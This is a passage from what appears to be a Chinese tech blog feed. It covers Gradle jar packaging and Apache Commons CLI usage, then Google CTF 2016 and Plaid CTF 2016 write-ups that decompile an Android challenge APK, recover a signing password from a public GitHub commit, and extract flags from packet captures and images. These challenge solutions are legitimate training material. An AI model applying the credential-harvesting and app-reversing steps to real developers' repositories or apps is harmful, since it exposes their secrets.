class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">compile</span> <span class="keyword">fileTree</span>(dir: <span class="string">'libs'</span>, <span class="keyword">include</span>: <span class="string">'*.jar'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h3><p>在<code>Java</code>插件添加属性到您的项目。这些属性通常足在启动时使用默认值。这里我们将依赖的<code>library</code>打包到<code>jar</code>包中：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jar &#123;</span><br><span class="line">    manifest &#123;</span><br><span class="line">        attributes <span class="string">'Main-Class'</span>: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> &#123;</span><br><span class="line">        <span class="keyword">configurations</span>.<span class="keyword">compile</span>.<span class="keyword">collect</span> &#123; it.isDirectory() ? it : zipTree(it) &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h3><p>之后需要告诉<code>Gradle</code>要发布<code>jar</code>的位置。在<code>Gradle</code>中， 比如<code>jar</code>文件等是发布到库中的。我们的例子中是发布到了本地路径。你也可以发布到远程位置或者多个位置。<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uploadArchives &#123;</span><br><span class="line">    <span class="keyword">repositories</span> &#123;</span><br><span class="line">        <span class="keyword">flatDir</span> &#123;</span><br><span class="line">            dirs <span class="string">'repos'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gradle uploadArchives</span><br><span class="line">:compileJava UP-TO-DATE</span><br><span class="line">:processResources UP-TO-DATE</span><br><span class="line">:classes UP-TO-DATE</span><br><span class="line">:jar UP-TO-DATE</span><br><span class="line">:startScripts UP-TO-DATE</span><br><span class="line">:distTar UP-TO-DATE</span><br><span class="line">:distZip UP-TO-DATE</span><br><span class="line">:uploadArchives</span><br><span class="line"></span><br><span class="line">BUILD SUCCESSFUL</span><br><span class="line"></span><br><span class="line">Total time: 3.279 secs</span><br></pre></td></tr></table></figure></p><p>这样之后，会在<code>repos</code>目录下看到生成的发布文件。</p><h3 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h3><p>有时候，我们需要在运行的时候给定参数：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run &#123;</span><br><span class="line">    <span class="keyword">if</span> (System.getProperty(<span class="string">"exec.args"</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        args System.getProperty(<span class="string">"exec.args"</span>).split()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>传递参数的时候，需要这样运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gradle run -Dexec.args=<span class="string">"-h"</span></span><br><span class="line">:compileJava UP-TO-DATE</span><br><span class="line">:processResources UP-TO-DATE</span><br><span class="line">:classes UP-TO-DATE</span><br><span class="line">:run</span><br><span class="line">usage: ra-tool</span><br><span class="line"> -h,--<span class="built_in">help</span>   Shows this <span class="built_in">help</span> message.</span><br><span class="line"></span><br><span class="line">BUILD SUCCESSFUL</span><br><span class="line"></span><br><span class="line">Total time: 2.724 secs</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Apache Commons CLI 教程</title>
      <link href="/2016/06/24/Apache-Commons-CLI-%E6%95%99%E7%A8%8B/"/>
      <url>/2016/06/24/Apache-Commons-CLI-%E6%95%99%E7%A8%8B/</url>
      <content type="html"><![CDATA[<h1 id="Apache-Commons-CLI"><a href="#Apache-Commons-CLI" class="headerlink" title="Apache Commons CLI"></a>Apache Commons CLI</h1><p><a href="https://commons.apache.org/proper/commons-cli/index.html" target="_blank" rel="noopener">Apache Commons CLI</a>是一个用于解析命令行参数的库。</p><a id="more"></a><p>Commons CLI 支持不同风格的选项：</p><ul><li>POSIX 风格 (<code>tar -zxvf foo.tar.gz</code>) </li><li>GNU 风格 (<code>du --human-readable --max-depth=1</code>) </li><li>Java 风格 (<code>java -Djava.awt.headless=true -Djava.net.useSystemProxies=trueFoo</code>)</li><li>有值的短选项 (<code>gcc -O2 foo.c</code>) </li><li>单一连字符的长选项 (<code>ant -projecthelp</code>)</li></ul><p>一个Commons CLI显示的经典帮助信息是这样的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">usage: ls</span><br><span class="line"> -A,--almost-all          <span class="keyword">do</span> not list implied . and ..</span><br><span class="line"> -a,--all                 <span class="keyword">do</span> not hide entries starting with .</span><br><span class="line"> -B,--ignore-backups      <span class="keyword">do</span> not list implied entried ending with ~</span><br><span class="line"> -b,--escape              <span class="built_in">print</span> octal escapes <span class="keyword">for</span> nongraphic characters</span><br><span class="line">    --block-size &lt;SIZE&gt;   use SIZE-byte blocks</span><br><span class="line"> -c                       with -lt: sort by, and show, ctime (time of last</span><br><span class="line">                          modification of file status information) with</span><br><span class="line">                          -l:show ctime and sort by name otherwise: sort</span><br><span class="line">                          by ctime</span><br><span class="line"> -C                       list entries by columns</span><br></pre></td></tr></table></figure></p><h2 id="定义阶段"><a href="#定义阶段" class="headerlink" title="定义阶段"></a>定义阶段</h2><p>每个命令必须定义一系列选项来描述应用的接口。<br><code>CLI</code>使用<code>Options</code>类来包含一系列<code>Option</code>的实例。有两种方式来创建<code>Option</code>实例，一种是通过构造函数，另一种使用<code>Options</code>的工厂函数。它们的使用方法如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Options options = <span class="keyword">new</span> Options();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用Option的构造函数</span></span><br><span class="line">Option help = <span class="keyword">new</span> Option(<span class="string">"h"</span>, <span class="string">"help"</span>, <span class="keyword">false</span>, <span class="string">"Shows this help message."</span> );</span><br><span class="line">options.addOption(help)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用Options的工厂函数</span></span><br><span class="line">options.addOption(<span class="string">"h"</span>, <span class="string">"help"</span>, <span class="keyword">false</span>, <span class="string">"Shows this help message."</span>);</span><br></pre></td></tr></table></figure></p><h2 id="解析阶段"><a href="#解析阶段" class="headerlink" title="解析阶段"></a>解析阶段</h2><p>解析阶段是指处理通过命令行传给应用的文本参数的过程。<br><code>CommandLineParser</code>类的<code>parse</code>函数接收<code>Options</code>实例和<code>String[]</code>参数，返回<code>CommandLine</code>的实例。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CommandLineParser parser = <span class="keyword">new</span> DefaultParser();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    CommandLine line = parser.parse(options, args);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">    System.out.println(<span class="string">"Unexpected exception:"</span> + e.getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="询问阶段"><a href="#询问阶段" class="headerlink" title="询问阶段"></a>询问阶段</h2><p>询问阶段中应用询问<code>CommandLine</code>是否含有定义的选项，根据定义的选项来执行相应的操作。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CommandLine line = parser.parse(options, args);</span><br><span class="line"><span class="keyword">if</span> (line.hasOption(<span class="string">"h"</span>) || line.hasOption(<span class="string">"help"</span>)) &#123;</span><br><span class="line">    HelpFormatter helpFormatter = <span class="keyword">new</span> HelpFormatter();</span><br><span class="line">    helpFormatter.printHelp(<span class="string">"ra-tool"</span>, options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上是<code>CLI</code>的基本用法，下面给一个相对完整的例子：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">CommandLineParser parser = <span class="keyword">new</span> DefaultParser();</span><br><span class="line"></span><br><span class="line">Options options = <span class="keyword">new</span> Options();</span><br><span class="line">options.addOption( <span class="string">"a"</span>, <span class="string">"all"</span>, <span class="keyword">false</span>, <span class="string">"do not hide entries starting with ."</span> );</span><br><span class="line">options.addOption( <span class="string">"A"</span>, <span class="string">"almost-all"</span>, <span class="keyword">false</span>, <span class="string">"do not list implied . and .."</span> );</span><br><span class="line">options.addOption( <span class="string">"b"</span>, <span class="string">"escape"</span>, <span class="keyword">false</span>, <span class="string">"print octal escapes for nongraphic "</span></span><br><span class="line">                                         + <span class="string">"characters"</span> );</span><br><span class="line">options.addOption( OptionBuilder.withLongOpt( <span class="string">"block-size"</span> )</span><br><span class="line">                                .withDescription( <span class="string">"use SIZE-byte blocks"</span> )</span><br><span class="line">                                .hasArg()</span><br><span class="line">                                .withArgName(<span class="string">"SIZE"</span>)</span><br><span class="line">                                .create() );</span><br><span class="line">options.addOption( <span class="string">"B"</span>, <span class="string">"ignore-backups"</span>, <span class="keyword">false</span>, <span class="string">"do not list implied entried "</span></span><br><span class="line">                                                 + <span class="string">"ending with ~"</span>);</span><br><span class="line">options.addOption( <span class="string">"c"</span>, <span class="keyword">false</span>, <span class="string">"with -lt: sort by, and show, ctime (time of last</span></span><br><span class="line"><span class="string">"</span> </span><br><span class="line">                               + <span class="string">"modification of file status information) with</span></span><br><span class="line"><span class="string">                                 "</span></span><br><span class="line">                               + <span class="string">"-l:show ctime and sort by name otherwise: sort</span></span><br><span class="line"><span class="string">                                 "</span></span><br><span class="line">                               + <span class="string">"by ctime"</span> );</span><br><span class="line">options.addOption( <span class="string">"C"</span>, <span class="keyword">false</span>, <span class="string">"list entries by columns"</span> );</span><br><span class="line"></span><br><span class="line">String[] args = <span class="keyword">new</span> String[]&#123; <span class="string">"--block-size=10"</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    CommandLine line = parser.parse( options, args );</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( line.hasOption( <span class="string">"block-size"</span> ) ) &#123;</span><br><span class="line">        System.out.println( line.getOptionValue( <span class="string">"block-size"</span> ) );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>( ParseException exp ) &#123;</span><br><span class="line">    System.out.println( <span class="string">"Unexpected exception:"</span> + exp.getMessage() );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Google CTF 2016 Write-ups</title>
      <link href="/2016/05/02/Google-CTF-2016-Write-ups/"/>
      <url>/2016/05/02/Google-CTF-2016-Write-ups/</url>
      <content type="html"><![CDATA[<h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2><h3 id="Ill-Intentions"><a href="#Ill-Intentions" class="headerlink" title="Ill Intentions"></a>Ill Intentions</h3><p>150 points<br>Do you have have ill intentions?</p><p>illintentions.apk</p><a id="more"></a><p>给了一个<code>APK</code>文件，反编译后，在<code>MainActivity</code>看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Select the activity you wish to interact with.To-Do: Add buttons to select</span><br><span class="line">activity, for now use Send_to_Activity</span><br></pre></td></tr></table></figure></p><p>然后去看<code>Send_to_Activity</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public void onReceive(Context context, Intent intent) &#123;</span><br><span class="line">    String v0 = intent.getStringExtra(&quot;msg&quot;);</span><br><span class="line">    if(v0.equalsIgnoreCase(&quot;ThisIsTheRealOne&quot;)) &#123;</span><br><span class="line">        context.startActivity(new Intent(context, ThisIsTheRealOne.class));</span><br><span class="line">    &#125;</span><br><span class="line">    else if(v0.equalsIgnoreCase(&quot;IsThisTheRealOne&quot;)) &#123;</span><br><span class="line">        context.startActivity(new Intent(context, IsThisTheRealOne.class));</span><br><span class="line">    &#125;</span><br><span class="line">    else if(v0.equalsIgnoreCase(&quot;DefinitelyNotThisOne&quot;)) &#123;</span><br><span class="line">        context.startActivity(new Intent(context, DefinitelyNotThisOne.class));</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        Toast.makeText(context, &quot;Which Activity do you wish to interact with?&quot;,</span><br><span class="line">Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过<code>msg</code>来控制启动另外三个Activity，然后分别看另外三个Activity分别干了什么。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">DefinitelyNotThisOne</span><br><span class="line">public void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    new TextView(((Context)this)).setText(&quot;Activity - Is_this_the_real_one&quot;);</span><br><span class="line">    Button v0 = new Button(((Context)this));</span><br><span class="line">    v0.setText(&quot;Broadcast Intent&quot;);</span><br><span class="line">    this.setContentView(((View)v0));</span><br><span class="line">    v0.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">        public void onClick(View v) &#123;</span><br><span class="line">            Intent v3 = new Intent();</span><br><span class="line">            v3.setAction(&quot;com.ctf.OUTGOING_INTENT&quot;);</span><br><span class="line">            DefinitelyNotThisOne.this.getResources().getString(R.string.str1);</span><br><span class="line">            String msg =</span><br><span class="line">DefinitelyNotThisOne.this.definitelyNotThis(Utilities.doBoth(DefinitelyNotThisOne</span><br><span class="line">                    .this.getResources().getString(R.string.test)),</span><br><span class="line">Utilities.doBoth(&quot;Test&quot;));</span><br><span class="line">            v3.putExtra(&quot;msg&quot;, msg);</span><br><span class="line">            DefinitelyNotThisOne.this.sendBroadcast(v3, &quot;ctf.permission._MSG&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ThisIsTheRealOne</span><br><span class="line">public void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    new TextView(((Context)this)).setText(&quot;Activity - This Is The Real One&quot;);</span><br><span class="line">    Button v0 = new Button(((Context)this));</span><br><span class="line">    v0.setText(&quot;Broadcast Intent&quot;);</span><br><span class="line">    this.setContentView(((View)v0));</span><br><span class="line">    v0.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">        public void onClick(View v) &#123;</span><br><span class="line">            Intent v3 = new Intent();</span><br><span class="line">            v3.setAction(&quot;com.ctf.OUTGOING_INTENT&quot;);</span><br><span class="line">            String msg =</span><br><span class="line">ThisIsTheRealOne.this.orThat(ThisIsTheRealOne.this.getResources()</span><br><span class="line">                    .getString(R.string.str2) + &quot;YSmks&quot;,</span><br><span class="line">Utilities.doBoth(ThisIsTheRealOne.this.getResources()</span><br><span class="line">                    .getString(R.string.dev_name)),</span><br><span class="line">Utilities.doBoth(this.getClass().getName()));</span><br><span class="line">            v3.putExtra(&quot;msg&quot;, msg);</span><br><span class="line">            ThisIsTheRealOne.this.sendBroadcast(v3, &quot;ctf.permission._MSG&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IsThisTheRealOne</span><br><span class="line">public void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    this.getApplicationContext();</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    new TextView(((Context)this)).setText(&quot;Activity - Is_this_the_real_one&quot;);</span><br><span class="line">    Button v0 = new Button(((Context)this));</span><br><span class="line">    v0.setText(&quot;Broadcast Intent&quot;);</span><br><span class="line">    this.setContentView(((View)v0));</span><br><span class="line">    v0.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">        public void onClick(View v) &#123;</span><br><span class="line">            Intent v3 = new Intent();</span><br><span class="line">            v3.setAction(&quot;com.ctf.OUTGOING_INTENT&quot;);</span><br><span class="line">            String v0 =</span><br><span class="line">IsThisTheRealOne.this.getResources().getString(R.string.str3) +</span><br><span class="line">&quot;\\VlphgQbwvj~HuDgaeTzuSt.@Lex^~&quot;;</span><br><span class="line">            String v1 =</span><br><span class="line">Utilities.doBoth(IsThisTheRealOne.this.getResources().getString(R.string.app_name));</span><br><span class="line">            String v4 = this.getClass().getName();</span><br><span class="line">            String msg = IsThisTheRealOne.this.perhapsThis(v0, v1,</span><br><span class="line">Utilities.doBoth(v4.substring(</span><br><span class="line">                    0, v4.length() - 2)));</span><br><span class="line">            v3.putExtra(&quot;msg&quot;, msg);</span><br><span class="line">            IsThisTheRealOne.this.sendBroadcast(v3, &quot;ctf.permission._MSG&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以主要把它们发送的消息Log出来就行了，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">KeepTryingThisIsNotTheActivityYouAreLookingForButHereHaveSomeInternetPoints!</span><br><span class="line"></span><br><span class="line">Told you so!</span><br><span class="line"></span><br><span class="line">Congratulation!YouFoundTheRightActivityHereYouGo-CTF&#123;IDontHaveABadjokeSorry&#125;</span><br></pre></td></tr></table></figure></p><h3 id="Interlude-Can-you-repo-it"><a href="#Interlude-Can-you-repo-it" class="headerlink" title="Interlude: Can you repo it?"></a>Interlude: Can you repo it?</h3><p>Can you repo it?<br>5 points<br>Do you think the developer of Ill Intentions knows how to set up public<br>repositories?</p><p>在前面apk的<code>strings.xml</code>文件中找到开发者ID是<code>l33tdev42</code>，然后去Github上搜索，找到一个Repository，去翻commits，在最后的commit中找到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">apply plugin: &apos;com.android.application&apos;</span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">    compileSdkVersion 23</span><br><span class="line">    buildToolsVersion &quot;23.0.2&quot;</span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId &quot;test.leetdev.helloworld&quot;</span><br><span class="line">        minSdkVersion 15</span><br><span class="line">        targetSdkVersion 23</span><br><span class="line">        versionCode 1</span><br><span class="line">        versionName &quot;1.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            minifyEnabled false</span><br><span class="line">            proguardFiles getDefaultProguardFile(&apos;proguard-android.txt&apos;),</span><br><span class="line">&apos;proguard-rules.pro&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    signingConfigs &#123;</span><br><span class="line">        create(&quot;release&quot;) &#123;</span><br><span class="line">            storeFile = file(&quot;leetdev_android.keystore&quot;)</span><br><span class="line">            storePassword = &quot;!lPpR4UC6JYaUj&quot;</span><br><span class="line">            keyAlias = &quot;appsKeys&quot;</span><br><span class="line">            keyPassword = &quot;ctf&#123;TheHairCutTookALoadOffMyMind&#125;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line">    compile fileTree(dir: &apos;libs&apos;, include: [&apos;*.jar&apos;])</span><br><span class="line">    testCompile &apos;junit:junit:4.12&apos;</span><br><span class="line">    compile &apos;com.android.support:appcompat-v7:23.2.0&apos;</span><br><span class="line">    compile &apos;com.android.support:design:23.2.0&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><p>Because the forensics guys know what you did last summer…</p><h3 id="No-Big-Deal"><a href="#No-Big-Deal" class="headerlink" title="No Big Deal"></a>No Big Deal</h3><p>50 points<br>Sometimes the answer is immediately obvious, sometimes it’s obscured.</p><p>Find the answer in here</p><p>下载文件后，用<code>Wireshark</code>分析总是崩溃，用如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings no-big-deal.pcap &gt; strings.txt</span><br></pre></td></tr></table></figure></p><p>在得到的字符串中有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">P0 WG)</span><br><span class="line">...</span><br><span class="line">NBDMAGICj0 W</span><br><span class="line">=3j0 W</span><br><span class="line">IHAVEOPT</span><br><span class="line">j0 W</span><br><span class="line">=3j0 W</span><br><span class="line">j0 W</span><br><span class="line">=3IHAVEOPTj0 W</span><br><span class="line">j0 W</span><br><span class="line">j0 W</span><br><span class="line">=3exportj0 W</span><br><span class="line">...</span><br><span class="line">Q1RGe2JldHRlcmZzLnRoYW4ueW91cnN9</span><br><span class="line">v1 W^</span><br><span class="line">v1 W</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>尝试用<code>base64</code>解码得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;Q1RGe2JldHRlcmZzLnRoYW4ueW91cnN9&apos; | base64 -d</span><br><span class="line">CTF&#123;betterfs.than.yours&#125;%</span><br></pre></td></tr></table></figure></p><h3 id="In-Recorded-Conversation"><a href="#In-Recorded-Conversation" class="headerlink" title="In Recorded Conversation"></a>In Recorded Conversation</h3><p>25 points<br>Can you find the flag?</p><p>irc.pcap</p><p>下载文件后直接用<code>wireshark</code>分析，得到：<br><img src="http://7oxj8e.com1.z0.glb.clouddn.com/2016/GoogleCTF/Forensics/irc.png" alt="ircflag"><br><code>CTF{some_are_leaks_}</code></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Plaid CTF 2016 Write-ups</title>
      <link href="/2016/04/25/Plaid-CTF-2016-Write-ups/"/>
      <url>/2016/04/25/Plaid-CTF-2016-Write-ups/</url>
      <content type="html"><![CDATA[<h1 id="Plaid-CTF-2016"><a href="#Plaid-CTF-2016" class="headerlink" title="Plaid CTF 2016"></a>Plaid CTF 2016</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="sanity-check"><a href="#sanity-check" class="headerlink" title="sanity check"></a>sanity check</h3><p>Misc (1 pts)<br>The flag is PCTF{poop}</p><a id="more"></a><h3 id="plane-site"><a href="#plane-site" class="headerlink" title="plane_site"></a>plane_site</h3><p>Misc (75 pts)<br>What? You can’t see the flag?</p><p>下载文件后，用神器<code>Stegsolve</code>打开，查看各个通道，得到：<br><img src="http://7oxj8e.com1.z0.glb.clouddn.com/2016/PlaidCTF/Misc/plane-site-flag.bmp" alt="plane siteflag"><br><code>PCTF{3_many_s3cr3ts}</code></p><h3 id="morset"><a href="#morset" class="headerlink" title="morset"></a>morset</h3><p>Misc (50 pts)<br>A mysterious signal… can you decode it? </p><p>Running at morset.pwning.xxx:11821</p><p>直接去连服务器，返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--. ...-- .---- --. .--. .-. -.... -.-. . .--- .---- -... ---.. --.. .-- ...--</span><br><span class="line">...-- -..- ...- .--. .-. .--. .. -.-. -.. --.- . ..- 